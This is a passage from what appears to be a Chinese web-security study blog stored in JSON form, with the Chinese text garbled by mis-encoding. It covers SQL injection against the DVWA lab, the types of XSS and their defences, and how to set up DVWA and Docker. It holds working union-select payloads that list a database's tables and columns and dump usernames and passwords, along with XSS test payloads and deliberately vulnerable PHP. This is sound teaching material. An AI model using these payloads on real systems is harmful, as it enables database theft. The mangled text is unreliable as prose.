è”åˆæŸ¥è¯¢sqlè¯­å¥ï¼Œpayloadå¦‚ä¸‹ï¼š\n0&#x27; union select 1, table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27;#  //åé¢çš„&#x27;#å¯å»æ‰\n\n\n\nç”±æ­¤è·å¾—ç›®çš„æ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨çš„è¡¨åã€‚ç”±äºå­—æ®µæ•°æœªçŸ¥ï¼Œè¿˜éœ€è¦å€ŸåŠ© information_schema çš„ COLUMNS è¡¨ï¼Œè¯¥è¡¨æä¾›äº†è¡¨ä¸­çš„åˆ—ä¿¡æ¯ã€‚è¯¦ç»†è¡¨è¿°äº†æŸå¼ è¡¨çš„æ‰€æœ‰åˆ—ä»¥åŠæ¯ä¸ªåˆ—çš„ä¿¡æ¯ã€‚\nselect column_name from information_schema.columns where table_name=&#x27;users&#x27;;    //æŸ¥è¯¢usersè¡¨çš„æ‰€æœ‰åˆ—å# æ³¨å…¥payload0&#x27; union select 1, column_name from information_schema.columns where table_name=&#x27;users# group_concat(column_name) ä½¿åœ¨ä¸€æ¡è®°å½•ä¸­æ˜¾ç¤º0&#x27; union select 1, group_concat(column_name) from information_schema.columns where table_name=&#x27;users\n\n\n\nç”±æ­¤å¾—åˆ°äº†æ•°æ®åº“åã€è¡¨åã€åˆ—åï¼Œå°±å¯ä»¥é…åˆselectæŸ¥è¯¢è¯­å¥ï¼Œè·å–æ¯ä¸€æ¡è®°å½•çš„å†…å®¹\n0&#x27; union select user, password from users#\n\n\n\n","categories":["æ¸—é€ï¼šä»0åˆ°1"],"tags":["web","æ¸—é€"]},{"title":"XSSè·¨ç«™è„šæœ¬æ”»å‡»","url":"/2022/12/24/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/","content":"XSS åŸºç¡€XSS ç®€ä»‹å’ŒåŸç†XSSï¼ˆCross Site Scripting è·¨ç«™è„šæœ¬æ”»å‡»ï¼‰ï¼ŒæŒ‡æ¶æ„æ”»å‡»è€…é€šè¿‡å‘ç½‘ç«™æ’å…¥æ¶æ„payloadæˆ–æ¶æ„è„šæœ¬ï¼Œä»è€Œç›—å–cookieã€sessionä¿¡æ¯ä»¥åˆ©ç”¨ç”¨æˆ·èº«ä»½è¿›è¡Œè¿è§„æ“ä½œã€ç›—å–ç”¨æˆ·èµ„æ–™ç­‰ç­‰ã€‚\nå…¶åŸç†æ˜¯æ”»å‡»è€…åœ¨ç½‘é¡µä¸­åµŒå…¥å®¢æˆ·ç«¯è„šæœ¬ï¼ˆé€šå¸¸æ˜¯JavaScriptçš„æ¶æ„è„šæœ¬ï¼‰ï¼Œå½“ç”¨æˆ·ä½¿ç”¨æµè§ˆå™¨åŠ è½½è¢«åµŒå…¥æ¶æ„ä»£ç çš„ç½‘é¡µæ—¶ï¼Œæ¶æ„è„šæœ¬ä»£ç å°±ä¼šåœ¨ç”¨æˆ·çš„æµè§ˆå™¨æ‰§è¡Œï¼Œé€ æˆè·¨ç«™è„šæœ¬æ”»å‡»ã€‚\nXSS å±å®³è·¨ç«™è„šæœ¬æ”»å‡»å¯èƒ½ä¼šäº§ç”Ÿç›—å–ï¼ˆæŒŸæŒï¼‰Cookieã€ç½‘ç»œé’“é±¼ã€æ¤é©¬æŒ–çŸ¿ã€åˆ·æµé‡ã€åŠ«æŒåå°ã€ç¯¡æ”¹é¡µé¢ã€å†…ç½‘æ‰«æã€åˆ¶é€ è •è™«ç­‰ã€‚\n\n\nå¸¸å‡ºç°çš„åœºæ™¯\né‡ç¾åŒºï¼šè¯„è®ºåŒºã€ç•™è¨€åŒºã€ä¸ªäººä¿¡æ¯ã€è®¢å•ä¿¡æ¯ç­‰\né’ˆå¯¹æ€§åŒºåŸŸï¼šç«™å†…ä¿¡ã€ç½‘é¡µå³æ—¶é€šè®¯ã€ç§ä¿¡ã€æ„è§åé¦ˆç­‰\nå­˜åœ¨é£é™©ï¼šæœç´¢æ¡†ã€å½“å‰ç›®å½•ã€å›¾ç‰‡å±æ€§ç­‰\n\nXSS ç±»å‹åå°„å‹ XSSç½‘ç«™å¯¹äºç”¨æˆ·æäº¤çš„æ•°æ®æ²¡æœ‰è¿›è¡Œè¿‡æ»¤æˆ–è½¬ä¹‰æ“ä½œï¼ˆæˆ–è€…è¿‡æ»¤ã€è½¬ä¹‰ä¸è¶³ï¼‰ï¼Œå¯¼è‡´æ”»å‡»è€…åµŒå…¥çš„æ¶æ„ä»£ç è¢«æäº¤ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯è§£æåï¼Œåœ¨ç›¸åº”å†…å®¹ä¸­è¿”å›è¾“å…¥çš„XSSä»£ç ï¼Œæœ€ç»ˆç”±æµè§ˆå™¨è§£é‡Šæ‰§è¡Œã€‚\n\nåå°„å‹XSS æ˜¯éæŒä¹…æ€§ã€å‚æ•°æ€§çš„è·¨ç«™è„šæœ¬ï¼Œæ¶æ„ä»£ç å¹¶æ²¡æœ‰ä¿å­˜åœ¨ç›®æ ‡ç½‘ç«™ï¼Œè€Œæ˜¯é€šè¿‡å¼•è¯±ç”¨æˆ·ç‚¹å‡»ä¸€ä¸ªé“¾æ¥åˆ°ç›®æ ‡ç½‘ç«™çš„æ¶æ„é“¾æ¥æ¥å®æ–½æ”»å‡»ã€‚\nå‡ºç°åœºæ™¯ï¼šå¤šå‡ºç°åœ¨æœç´¢æ¡†æˆ–è¾“å…¥æ¡†\n\nåŸå‹å¦‚ä¸‹ï¼š\n&lt;?phpecho &#x27;your input:&#x27; . $_GET[&#x27;input&#x27;];?&gt;\n\nè‹¥inputä¸º&lt;script&gt;alert(/XSS/)&lt;/script&gt;ä¸”inputå€¼æœªç»ä»»ä½•è¿‡æ»¤ä¾¿ç›´æ¥è¾“å‡ºï¼Œåˆ™æœåŠ¡ç«¯è§£æåï¼Œechoè¯­å¥ä¼šå°†å®¢æˆ·ç«¯è¾“å…¥çš„ä»£ç å®Œæ•´åœ°è¾“å‡ºåˆ°HTTPå“åº”ä¸­ï¼Œæµè§ˆå™¨è§£æå¹¶æ‰§è¡Œï¼Œä»è€Œå®ç°å¼¹çª—ã€‚å½“ç„¶ï¼Œæ”»å‡»è€…å¯ä»¥ç›´æ¥ä»¥æ­¤æ„é€ urlï¼Œå½“ç”¨æˆ·å—æƒ‘ç‚¹å‡»è¯¥urlé“¾æ¥ï¼Œæ”»å‡»å°±å‘ç”Ÿäº†ã€‚\nåå°„å‹XSS åˆ©ç”¨æµç¨‹\n\nå­˜å‚¨å‹ XSSåå°„å‹XSSæ¯æ¬¡çš†éœ€è¦ç”¨æˆ·æäº¤ä»£ç ï¼ˆä¹Ÿå³â€œç‚¹å‡»â€ï¼‰æ‰èƒ½è¿›è¡Œæ”»å‡»ã€‚è€Œå­˜å‚¨å‹XSSæäº¤çš„XSSä»£ç ä¼šå­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯ï¼Œä¸‹æ¬¡è¯·æ±‚è¯¥ç½‘é¡µæ—¶æ— éœ€å†æ¬¡æäº¤XSSä»£ç ã€‚å¸¸è§çš„åº”ç”¨åœºæ™¯æœ‰ç•™è¨€æ¿ã€åœ¨çº¿èŠå¤©å®¤ã€é‚®ä»¶æœåŠ¡æˆ–é»‘å®¢çš„åµŒå…¥æ¶æ„JavaScriptä»£ç çš„åšå®¢æ–‡ç« ç­‰ã€‚\nå½“æ”»å‡»è€…æäº¤åŒ…å«XSSä»£ç çš„ç•™è¨€åï¼ŒæœåŠ¡ç«¯ä¼šå°†å…¶å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå½“å…¶ä»–ç”¨æˆ·è®¿é—®ç½‘é¡µæŸ¥çœ‹ç•™è¨€æ—¶ï¼ŒæœåŠ¡ç«¯å°†ä»æ•°æ®åº“ä¸­æŸ¥è¯¢å·²æœ‰ç•™è¨€ï¼Œå¹¶å°†å…¶å†…å®¹è¾“å‡ºåœ¨HTTPå“åº”ä¸­ï¼Œç”±æµè§ˆå™¨å¯¹åŒ…å«æ¶æ„ä»£ç çš„å“åº”è§£æå¹¶æ‰§è¡Œã€‚\nåŸå‹å¦‚ä¸‹ï¼š\n&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123;    // Get input    $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] );    $name    = trim( $_POST[ &#x27;txtName&#x27; ] );    // Sanitize message input    $message = stripslashes( $message );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Sanitize name input    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Update database    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );    //mysql_close();&#125;?&gt; \n\næ”»å‡»è€…æäº¤ç•™è¨€&lt;script&gt;alert(/XSS/)&lt;/script&gt;åï¼ŒXSSä»£ç è¢«ä¿å­˜åœ¨ æ•°æ®åº“ä¸­ï¼Œå¹¶ä¸”ç«‹å³æ‰§è¡Œäº†ä¸€æ¬¡æŸ¥è¯¢ï¼ŒXSSä»£ç ç›´æ¥è¢«è§¦å‘ã€‚å½“å…¶ä»–ç”¨æˆ·è®¿é—®ç½‘é¡µæ—¶ï¼ŒæœåŠ¡ç«¯éƒ½å°†ä»æ•°æ®åº“ä¸­æŸ¥è¯¢åˆ°è¯¥XSSä»£ç ï¼Œè§¦å‘æ‰§è¡Œï¼Œä»è€Œè¢«ç›—å–cookieï¼ˆsessionidï¼‰ç­‰ä¿¡æ¯ã€‚\nå­˜å‚¨å‹XSS åˆ©ç”¨æµç¨‹\n\nDOM XSSDOM ç®€ä»‹\nDOMï¼Œå…¨ç§°Document Object Model(æ–‡æ¡£å¯¹è±¡æ¨¡å‹)ï¼Œæ˜¯W3Cæ¨èçš„ä¸€ç§ç‹¬ç«‹äºå¹³å°å’Œè¯­è¨€çš„æ ‡å‡†ï¼Œå®šä¹‰äº†è®¿é—®HTMLå’ŒXMLæ–‡æ¡£çš„æ ‡å‡†ã€‚\nDomå³Windowå¯¹è±¡ä¸‹å†…ç½®çš„documentå¯¹è±¡\n\ndocumentå¯¹è±¡æä¾›äº†éå¸¸å¤šçš„æ“ä½œæ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡documentå¯¹è±¡å®ç°å¯¹ç½‘é¡µå†…å®¹çš„ä¸€äº›æ“ä½œå¦‚æ–‡æœ¬çš„ä¿®æ”¹ã€å±æ€§çš„ä¿®æ”¹ã€å…ƒç´ çš„è·å–ç­‰ã€‚\nä¸åå°„å‹ XSSä¸åŒï¼ŒDOM XSSä¸éœ€ç»ç”±æœåŠ¡å™¨çš„å“åº”ã€å¤„ç†\n\n\n\nDOM-XSSåŸºäºå‰ç«¯åšçš„ä¸€äº›é™åˆ¶å’Œç­›é€‰ï¼Œå¯¹å½“å‰é¡µé¢åšä¸€äº›ç›´æ¥åŒ–çš„ä¿®æ”¹ã€‚ç®€å•å»ç†è§£å°±æ˜¯è¾“å‡ºç‚¹åœ¨DOMï¼Œå±äºç‰¹æ®Šçš„åå°„å‹XSSã€‚\n\nå¸¸è§çš„DOMæ–¹æ³•\n\n\nDOM-XSS åˆ©ç”¨æµç¨‹å…¶åˆ©ç”¨ä¸åå°„å‹XSSååˆ†ç›¸ä¼¼ï¼Œä¸å†èµ˜è¿°ã€‚ä½†éœ€è¦æ³¨æ„ï¼šç”±äºå‰ç«¯çš„é™åˆ¶ï¼Œæˆ‘ä»¬éœ€è¦åœ¨URLä¸­è¾“å…¥XSSæ¢æµ‹è„šæœ¬ã€‚\nä¸‰ç§ç±»å‹çš„æ¯”è¾ƒ\n\n\nXSSç±»å‹\nå­˜å‚¨å‹\nåå°„å‹\nDOMå‹\n\n\n\nè§¦å‘è¿‡ç¨‹\n1ã€é»‘å®¢æ„é€ XSSè„šæœ¬2ã€æ­£å¸¸ç”¨æˆ·è®¿é—®æºå¸¦XSSè„šæœ¬çš„é¡µé¢\næ­£å¸¸ç”¨æˆ·è®¿é—®æºå¸¦XSSè„šæœ¬çš„URL\næ­£å¸¸ç”¨æˆ·è®¿é—®æºå¸¦XSSè„šæœ¬çš„URL\n\n\næ•°æ®å­˜å‚¨\næœåŠ¡å™¨\nURL\nURL\n\n\nè°æ¥è¾“å‡º\nåç«¯Webåº”ç”¨ç¨‹åº\nåç«¯Webåº”ç”¨ç¨‹åº\nå‰ç«¯JavaScript\n\n\nè¾“å‡ºä½ç½®\nHTTPå“åº”ä¸­\nHTTPå“åº”ä¸­\nåŠ¨æ€æ„é€ çš„DOMèŠ‚ç‚¹ä¸­\n\n\næ˜¯å¦æŒä¹…\næ˜¯\nå¦\nå¦\n\n\né˜²å¾¡æ‰‹æ®µ\nå¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œåˆç†éªŒè¯\n\nå¯¹ (, &lt; , &gt; , &#39; , &quot; ç­‰ç‰¹æ®Šå­—ç¬¦ä»¥åŠ &lt;script&gt;, javascript ç­‰å­—ç¬¦ä¸²è¿›è¡Œè¿‡æ»¤\n\næ ¹æ®æ•°æ®ä½ç½®è®¾ç½®æ°å½“çš„è¾“å‡ºç¼–ç \n\næ ¹æ®æ•°æ®å°†è¦è‡³äºHTMLä¸Šä¸‹æ–‡ä¸­çš„ä¸åŒä½ç½®(HTMLæ ‡å‡†ã€HTMLå±æ€§ã€Javascriptè„šæœ¬ã€CSSã€URL)ï¼Œå¯¹æ‰€æœ‰ä¸å¯ä¿¡æ•°æ®è¿›è¡Œæ°å½“çš„è¾“å‡ºç¼–ç \n\nè®¾ç½®HttpOnlyå±æ€§\n\né¿å…æ”»å‡»è€…åˆ©ç”¨XSSå±æ€§è¿›è¡ŒCookieåŠ«æŒæ”»å‡»ã€‚\n","categories":["æ¸—é€ï¼šä»0åˆ°1"],"tags":["web","æ¸—é€","å¸¸è§æ¼æ´"]},{"title":"webåŸºç¡€å’Œé¶åœºæ­å»º","url":"/2022/12/12/web%E5%9F%BA%E7%A1%80%E5%92%8C%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/","content":"Webæ˜¯äº’è”ç½‘çš„æ€»ç§°ï¼Œå…¨ç§°å³World Wide Webï¼Œ ç¼©å†™ä¸ºWWWï¼Œå…¨çƒå¹¿åŸŸç½‘ï¼Œä¹Ÿç§°ä¸ºä¸‡ç»´ç½‘ï¼Œå®ƒæ˜¯ä¸€ç§åŸºäºè¶…æ–‡æœ¬å’ŒHTTPçš„ã€å…¨çƒæ€§çš„ã€åŠ¨æ€äº¤äº’çš„ã€è·¨å¹³å°çš„åˆ†å¸ƒå¼å›¾å½¢ä¿¡æ¯ç³»ç»Ÿã€‚ç®€å•æ¥è¯´ï¼ŒWebæ˜¯ä¸€ç§ä½“ç³»ç»“æ„ï¼Œé€šè¿‡å®ƒå¯ä»¥è®¿é—®éå¸ƒäºå› ç‰¹ç½‘ä¸»æœºä¸Šçš„è¿æ¥æ–‡æ¡£ã€‚webå®‰å…¨ç®€å•æ¥è¯´å°±æ˜¯ç½‘ç«™çš„å®‰å…¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦å­¦ä¹ çš„æ˜¯ï¼Œç½‘ç«™ä¸Šå¯èƒ½å‡ºç°å“ªäº›æ¼æ´ï¼ˆå¸¸è§æ¼æ´ç±»å‹å’ŒåŸç†ï¼‰ï¼Œå¦‚ä½•å¯»æ‰¾è¿™äº›æ¼æ´ï¼Œå¦‚ä½•åˆ©ç”¨è¿™äº›æ¼æ´ã€‚æœ¬æ–‡å¯ä»¥ä½œä¸ºâ€œæ¸—é€ï¼šä»0åˆ°1â€çš„å…ˆå¯¼ç¯‡ç›®ã€‚\n\næ¼æ´æŒ–æ˜æ¼æ´å®šä¹‰å¯¹äºæ¼æ´çš„å®˜æ–¹å®šä¹‰ï¼šæ¼æ´æ˜¯åœ¨ç¡¬ä»¶ã€è½¯ä»¶ã€åè®®çš„å…·ä½“å®ç°æˆ–ç³»ç»Ÿå®‰å…¨ç­–ç•¥ä¸Šå­˜åœ¨çš„ç¼ºé™·ï¼Œä»è€Œä½¿æ”»å‡»è€…èƒ½åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹è®¿é—®æˆ–ç ´åç³»ç»Ÿã€‚é€šä¿—çš„è®²ï¼Œåªè¦å¯ä»¥ç»™å‚å•†å¸¦æ¥æŸå¤±çš„éƒ½å¯ä»¥è¢«å«åšæ¼æ´ã€‚\n\n\næ¼æ´ç±»å‹(OWASP Top 10 2021 and part of Top 10 2017)\n\n\n\n\n\n\n\nA01\n2021-å¤±æ•ˆçš„è®¿é—®æ§åˆ¶(Broken Access Control)\n\n\nA02\n2021-åŠ å¯†æœºåˆ¶å¤±è´¥(Cryptographic Failures)\n\n\nA03\n2021-æ³¨å…¥(Injection)\n\n\nA04\n2021-ä¸å®‰å…¨è®¾è®¡(Insecure Design)\n\n\nA05\n2021-å®‰å…¨é…ç½®é”™è¯¯(Security Misconfiguration)\n\n\nA06\n2021-è‡ªå¸¦ç¼ºé™·å’Œè¿‡æ—¶çš„ç»„ä»¶(Vulnerable and Outdated Components)\n\n\nA07\n2021-èº«ä»½è¯†åˆ«å’Œèº«ä»½éªŒè¯é”™è¯¯(Identification and Authentication Failures)\n\n\nA08\n2021-è½¯ä»¶å’Œæ•°æ®å®Œæ•´æ€§æ•…éšœ(Software and Data Integrity Failures)\n\n\nA09\n2021-å®‰å…¨æ—¥å¿—å’Œç›‘æ§æ•…éšœ(Security Logging and Monitoring Failures)\n\n\nA10\n2021-æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ (Sever-Side Request Forgery)\n\n\nA03\n2017-æ•æ„Ÿä¿¡æ¯æ³„éœ²(Sensitive Data Exposure)\n\n\nA07\n2017-è·¨ç«™è„šæœ¬æ”»å‡»(XSS)\n\n\nA08\n2017-ä¸å®‰å…¨çš„ååºåˆ—åŒ–\n\n\nA09\n2017-ä½¿ç”¨å«æœ‰å·²çŸ¥æ¼æ´çš„ç»„ä»¶\n\n\nA10\n2017-ä¸è¶³çš„æ—¥å¿—è®°å½•å’Œç›‘æ§\n\n\nä¸éš¾å‘ç°ï¼Œè®¸å¤šCTFæ¯”èµ›çš„webé¢˜å°±æ˜¯ä»è¿™äº›æ¼æ´ä¸­å‡ºé¢˜ï¼Œå› æ­¤å¿…é¡»å¯¹å¸¸è§çš„æ¼æ´è¿›è¡Œå…·ä½“ç»†è‡´çš„äº†è§£ï¼Œè¿™ä¹Ÿæ˜¯â€œæŒ–æ´â€çš„åŸºç¡€ã€‚\næ¼æ´é¶åœºä¹‹DVWADVWAæ˜¯OWASPå®˜æ–¹ç¼–å†™çš„PHPç½‘ç«™ï¼ŒåŒ…å«äº†å„ç§ç½‘ç«™å¸¸è§æ¼æ´ï¼Œå¯ä»¥å­¦ä¹ æ”»å‡»åŠä¿®å¤æ–¹å¼ã€‚å…³äºé¶åœºçš„æ­å»ºï¼Œå¯ä»¥ç”¨æºç é…åˆphpStudyå°çš®é¢æ¿å®ç°ï¼ˆå¸‚é¢ä¸Šæœ‰è®¸å¤šç§ç±»çš„é¶åœºï¼Œå¦ä¸€ä¸ªæˆ‘æ­£åœ¨å­¦ä¹ ä½¿ç”¨çš„å°±æ˜¯pikachuï¼‰ï¼Œå…·ä½“æ­¥éª¤å¯å‚è€ƒå¦‚ä¸‹è¿‡ç¨‹ï¼š\nDVWAçš„å®‰è£…\n1 ä¸‹è½½å®‰è£… phpStudy å’Œ DVWAæºç \n\nå¯ä»¥æ ¹æ®éœ€è¦ï¼Œä¸‹è½½åˆé€‚ç‰ˆæœ¬çš„phpStudy.\nphpStudyä¸‹è½½åœ°å€:phpStudy\næ¥ä¸‹æ¥è·å–DVWAé¶åœºæºä»£ç .\nDVWAæºä»£ç ä¸‹è½½åœ°å€1:DVWAæºç \nDVWAæºä»£ç ä¸‹è½½åœ°å€2:DVWAæºç \n\n2 å°†è§£å‹åçš„DVWAæºä»£ç æ”¾ç½®phpStudyçš„å®‰è£…ç›®å½•WWWæ–‡ä»¶å¤¹ä¸­(æœ‰æ—¶éœ€è¦ä¿®æ”¹æºä»£ç æ–‡ä»¶å¤¹ådvwa-masterä¸ºDVWA)\n\n\n3 è¿›å…¥DVWA&#x2F;configç›®å½•ï¼Œå°†config.inc.php.distä¸­çš„diståˆ å»\n\n\n4 æ‰“å¼€åˆšåˆšé‡å‘½åçš„config.inc.phpæ–‡ä»¶ï¼Œä¿®æ”¹db_userå’Œdb_password  &#x2F;&#x2F;é»˜è®¤æ”¹ä¸ºroot root\n\n\n\nDVWAåœ¨åˆ›å»ºçš„æ—¶å€™éœ€è¦åœ¨æœ¬åœ°å®‰è£…åˆ›å»ºä¸€ä¸ªæ•°æ®åº“(database)ï¼Œä¹Ÿå°±æ„å‘³ç€éœ€è¦è¿æ¥åˆ°æœ¬åœ°å·²æœ‰çš„MySQLçš„æ•°æ®åº“çš„è½¯ä»¶ï¼Œç„¶åå†ç”¨è¿™ä¸ªè½¯ä»¶å»åˆ›å»ºä¸€ä¸ªDVWAçš„æ•°æ®åº“ã€‚å› æ­¤ï¼Œå…¶éœ€è¦MySQLè´¦å·å¯†ç æˆæƒã€‚è¿™é‡Œæˆ‘æ²¡æœ‰ä½¿ç”¨phpStudyçš„MySQLï¼Œè€Œæ˜¯ä½¿ç”¨æœ¬åœ°è‡ªå·±å®‰è£…çš„MySQLï¼Œç”¨æˆ·åä¸ºrootï¼Œå¯†ç ä¸º123@hui.å¦‚ä¸‹å›¾ç”Ÿæˆä¸€ä¸ªæ•°æ®åº“\n\n\nè€Œå¯¹äºphpStudyä¸­é›†æˆçš„MySQLæœåŠ¡çš„è´¦å·å¯†ç é»˜è®¤ä¸ºrootå’Œrootï¼Œæ•…è‹¥ä½¿ç”¨phpStudyä¸­çš„MySQLï¼Œéœ€è¦å°†ä¿®æ”¹db_userå’Œdb_passwordä¸ºrootå’Œroot.\n\n5 æµè§ˆå™¨è®¿é—®http://localhost/DVWA/setup.php, ç‚¹å‡»æœ€ä¸‹æ–¹çš„Create Database.\n\n\n6 æµè§ˆå™¨è®¿é—®http://localhost/DVWA/, è¾“å…¥ç”¨æˆ·åadminï¼Œå¯†ç passwordï¼Œç™»å½•DVWAå³å¯ã€‚\n\nDVWAçš„ä½¿ç”¨åœ¨DVWA Securityä¸­å¯ä»¥æ‰‹åŠ¨è°ƒæ•´é¶æœºæºç çš„å®‰å…¨çº§åˆ«ï¼Œåˆ†åˆ«ä¸º Lowï¼ŒMediumï¼ŒHighï¼ŒImpossibleï¼Œçº§åˆ«è¶Šé«˜ï¼Œå®‰å…¨é˜²æŠ¤è¶Šä¸¥æ ¼ï¼Œæ¸—é€éš¾åº¦è¶Šå¤§ã€‚ä¸€èˆ¬ Low çº§åˆ«åŸºæœ¬æ²¡æœ‰åšé˜²æŠ¤æˆ–è€…åªæ˜¯æœ€ç®€å•çš„é˜²æŠ¤ï¼Œå¾ˆå®¹æ˜“å°±èƒ½å¤Ÿæ¸—é€æˆåŠŸï¼›è€Œ Medium ä¼šä½¿ç”¨åˆ°ä¸€äº›éå¸¸ç²—ç³™çš„é˜²æŠ¤ï¼Œéœ€è¦ä½¿ç”¨è€…æ‡‚å¾—å¦‚ä½•å»ç»•è¿‡é˜²æŠ¤æªæ–½ï¼›High çº§åˆ«çš„é˜²æŠ¤åˆ™ä¼šå¤§å¤§æé«˜é˜²æŠ¤çº§åˆ«ï¼Œä¸€èˆ¬ High çº§åˆ«çš„é˜²æŠ¤éœ€è¦ç»éªŒéå¸¸ä¸°å¯Œæ‰èƒ½æˆåŠŸæ¸—é€ï¼›æœ€å Impossible åŸºæœ¬æ˜¯ä¸å¯èƒ½æ¸—é€æˆåŠŸçš„ï¼Œæ‰€ä»¥ Impossible çš„æºç ä¸€èˆ¬å¯ä»¥è¢«å‚è€ƒä½œä¸ºç”Ÿäº§ç¯å¢ƒ Web é˜²æŠ¤çš„æœ€ä½³æ‰‹æ®µã€‚\nDVWA ä¸€å…±åŒ…å«äº†åä¸ªæ”»å‡»æ¨¡å—ï¼Œåˆ†åˆ«æ˜¯ï¼šBrute Forceï¼ˆæš´åŠ›ï¼ˆç ´è§£ï¼‰ï¼‰ã€Command Injectionï¼ˆå‘½ä»¤è¡Œæ³¨å…¥ï¼‰ã€CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰ã€- File Inclusionï¼ˆæ–‡ä»¶åŒ…å«ï¼‰ã€File Uploadï¼ˆæ–‡ä»¶ä¸Šä¼ ï¼‰ã€Insecure CAPTCHA ï¼ˆä¸å®‰å…¨çš„éªŒè¯ç ï¼‰ã€SQL Injectionï¼ˆSQLæ³¨å…¥ï¼‰ã€SQL Injectionï¼ˆBlindï¼‰ï¼ˆSQLç›²æ³¨ï¼‰ã€XSSï¼ˆReflectedï¼‰ï¼ˆåå°„å‹è·¨ç«™è„šæœ¬ï¼‰ã€XSSï¼ˆStoredï¼‰ï¼ˆå­˜å‚¨å‹è·¨ç«™è„šæœ¬ï¼‰ã€‚åŒ…å«äº† OWASP TOP10 çš„æ‰€æœ‰æ”»å‡»æ¼æ´çš„ç»ƒä¹ ç¯å¢ƒï¼Œä¸€ç«™å¼è§£å†³æ‰€æœ‰ Web æ¸—é€çš„å­¦ä¹ ç¯å¢ƒã€‚\nDockeråŸºç¡€Dockerï¼Œå³â€œå®¹å™¨â€ï¼Œä¾¿äºç¯å¢ƒçš„ç§»æ¤ã€å®‰è£…å’Œç®¡ç†ï¼Œå¹¶ä¸”å…·æœ‰å¾ˆé«˜çš„å®‰å…¨æ€§ã€‚å®¹æ˜“æƒ³è±¡ï¼Œå¦‚æœç”¨ä»¥ä¸Šçš„åŠæ³•éƒ¨ç½²DVWAé¶åœºï¼Œå½“é¶åœºè¢«æ”»å‡»æ—¶ï¼Œæœ¬åœ°å°†ä¼šæ˜¯éå¸¸å±é™©çš„ã€‚\nè®¤è¯†DockerDockeræ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼Œè®©å¼€å‘è€…å¯ä»¥æ‰“åŒ…ä»–ä»¬çš„åº”ç”¨ä»¥åŠä¾èµ–åŒ…åˆ°ä¸€ä¸ªå¯ç§»æ¤çš„é•œåƒä¸­ï¼Œç„¶åå‘å¸ƒåˆ°ä»»ä½•æµè¡Œçš„Linuxæˆ–Windowsæ“ä½œç³»ç»Ÿçš„æœºå™¨ä¸Šï¼Œä¹Ÿå¯ä»¥å®ç°è™šæ‹ŸåŒ–ã€‚å®¹å™¨æ˜¯å®Œå…¨ä½¿ç”¨æ²™ç®±æœºåˆ¶ï¼Œç›¸äº’ä¹‹é—´ä¸ä¼šæœ‰ä»»ä½•æ¥å£\nDockerå®‰è£…å’Œé…ç½®è¿™é‡Œåœ¨kali-linux-2022.1æ“ä½œç³»ç»Ÿä¸­è¿›è¡ŒDockerçš„å®‰è£…å’Œé…ç½®ã€‚\næŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯å’Œå†…æ ¸ç‰ˆæœ¬uname -a  # æ˜¾ç¤ºç³»ç»Ÿä¿¡æ¯uname -v  # æ˜¾ç¤ºå†…æ ¸ç‰ˆæœ¬\n\n\n\næ›´æ¢aptæºé»˜è®¤çš„æºåœ¨å›½å¤–ï¼Œæˆ‘ä»¬é€šè¿‡è¿™ä¸ªæºå»ä¸‹è½½æ—¶è€—æ—¶å°†ä¼šå¾ˆä¹…ï¼Œæ¢æºå¯ä»¥æé«˜æ•ˆç‡ã€‚\nsudo vim /etc/apt/sources.list  # aptæºè·¯å¾„: /etc/apt/sources.list\n\næŒ‰iè¿›å…¥ç¼–è¾‘æ¨¡å¼ï¼Œä»ä»¥ä¸‹å›½å†…æºä¸­é€‰æ‹©ä¸€ä¸ªå¤åˆ¶è¿›å»ç„¶åæŒ‰escé”®è¾“å…¥:wqä¿å­˜é€€å‡ºã€‚\n#ä¸­ç§‘å¤§deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib#é˜¿é‡Œäº‘#deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#æ¸…åå¤§å­¦#deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free#deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free#æµ™å¤§#deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free#deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free#ä¸œè½¯å¤§å­¦#deb http://mirrors.neusoft.edu.cn/kali 